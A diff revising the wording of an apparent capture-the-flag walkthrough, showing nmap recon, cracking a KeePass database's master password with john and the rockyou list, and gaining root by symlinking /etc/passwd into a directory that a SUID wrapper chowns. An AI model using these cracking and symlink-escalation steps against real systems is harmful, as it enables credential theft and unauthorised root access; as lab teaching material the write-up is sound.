@@ -2,7 +2,7 @@
 
 ## 1. Reconnaissance
 
-The initial `nmap` scan reveals the following services:
+An initial `nmap` scan reveals the following services:
 
 ```bash
 # nmap -A -p- 192.168.60.5
@@ -91,7 +91,7 @@ ftp> get web.kdbx
 226 Transfer complete.
 ```
 
-After terminating the FTP session, we can investigate the files locally on the Kali machine. It appears that the only interesting file is `web.kdbx`, which probably is a password database:
+After terminating the FTP session, we can investigate the files locally on the Kali machine. The only interesting file appears to be `web.kdbx`, which is probably a password database:
 
 ```bash
 # file web.kdbx         
@@ -104,23 +104,23 @@ Right now, there are a couple of attacks that should be considered:
 
 1. continue enumeration (e.g. directory busting)
 
-2. bruteforce web login credentials
+2. try different web login credentials
 
-3. bruteforce master password of password database
+3. crack the master password of the password database
 
 4. check for vulnerable software versions
 
 5. ...
 
-We will stick with option 3 and bruteforce the KeePass database to keep this walkthrough as straightforward as possible.
+We will stick with option 3 and crack the password of the KeePass database to keep this walkthrough as straightforward as possible.
 
-To bruteforce the database, we use the password cracking tool `john`. First, we need to convert our password hash to a format that can be parsed by `john`:
+To obtain the password, we use the password cracking tool `john`. First, we need to convert our password hash to a format that can be parsed by `john`:
 
 ```bash
 # keepass2john web.kdbx > web.hash
 ```
 
-Now, we can start the bruteforce attack by providing the hash file and a wordlist. After a short time, we can see that the password of the KeePass file is `london`:
+Now, we can start our attack by providing the hash file and a word list. After a short time, we can see that the password of the KeePass file is `london`:
 
 ```bash
 # john --wordlist=/usr/share/wordlists/rockyou.txt web.hash 
@@ -138,7 +138,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-> Note: You will need to unzip the `rockyou.txt` wordlist if you use it for the first time.
+> Note: You will need to unzip the `rockyou.txt` word list if you use it for the first time.
 
 Opening the password database in KeePassX provides us with the password for the web interface:
 
@@ -206,7 +206,7 @@ total 24
 -rw-r--r--  1 root root  1183 Jul  1 19:59 control-panel.c
 ```
 
-So let's investigate the source code in `control-panel.c`:
+So let's investigate the code in `control-panel.c`:
 
 ```c
 #include <string.h>
@@ -251,7 +251,7 @@ int main(int argc, char* argv[]) {
 }
 ```
 
-This program seems to be a simple wrapper that just calls some other executables. But there is one very interesting line:
+This program is a simple wrapper that just calls other executables. But there is one very interesting line:
 
 ```c
 execl("/usr/bin/chown", "/usr/bin/chown", "-RH", "www-data:", "/var/www/html", NULL);
@@ -267,7 +267,7 @@ The attack works the following way:
    ln -s /etc/passwd /var/www/html/passwd
    ```
 
-2. Send the command to "restart the web server". This will call  the`chown` command from above, follow the symbolic link and change the owner of `/etc/passwd` to `www-data`.
+2. Run the command to "restart the web server". This will call  the`chown` command from above, follow the symbolic link and change the owner of `/etc/passwd` to `www-data`.
    
    ```bash
    /opt/control-panel web-restart
@@ -292,5 +292,3 @@ Well done, my friend: CANTALOUPE{f0llow1ng_syml1nk5_c4n_b3_d4ng3r0us}
 ```
 
 > **Remark:** Despite technically logging in as user `toor`, we are effectively `root` since both users have the same user id of 0.
-
-
